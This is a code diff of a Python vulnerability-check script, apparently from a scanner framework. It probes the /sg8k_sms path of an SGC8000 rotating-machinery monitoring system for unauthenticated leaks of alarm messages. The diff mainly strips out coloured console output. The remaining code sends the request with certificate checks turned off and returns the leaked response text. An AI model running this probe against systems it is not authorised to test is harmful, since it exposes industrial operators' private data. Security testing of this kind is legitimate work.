@@ -8,8 +8,7 @@ description: 访问/sg8k_sms,未授权获取监控系统报警信息。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
 
 class sgc8000_sg8k_sms_disclosure_BaseVerify:
     def __init__(self, url):
@@ -24,18 +23,14 @@ class sgc8000_sg8k_sms_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"SG8000" in req.text and r"getMachineList" in req.text and r"cancelSendMessage" in req.text:
-                cprint("[+]存在sgc8000 大型旋转机监控系统报警短信模块泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")
                 return True, vulnurl, "sgc8000 大型旋转机监控系统报警短信模块泄露", str(payload), req.text
             else:
-                cprint("[-]不存在sgc8000_sg8k_sms_disclosure漏洞", "white", "on_grey")
                 return False, None, None, None, None
 
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = sgc8000_sg8k_sms_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
